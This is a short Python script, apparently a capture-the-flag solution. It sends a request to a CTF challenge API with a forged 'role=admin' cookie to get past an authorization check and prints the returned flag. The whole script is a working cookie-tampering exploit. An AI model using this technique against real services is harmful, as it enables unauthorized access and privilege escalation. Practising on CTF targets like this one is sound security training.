

import urllib.request
import json

TARGET = "https://winden-ctf.vercel.app/api/metrics"

print("[*] Sending request with Cookie: role=admin ...")

req = urllib.request.Request(TARGET)
req.add_header("User-Agent", "Mozilla/5.0")
req.add_header("Cookie", "role=admin")

response = urllib.request.urlopen(req)
data = json.loads(response.read().decode("utf-8"))

print(f"[+] Response: {data}")
print(f"\n[FLAG] {data['flag']}")
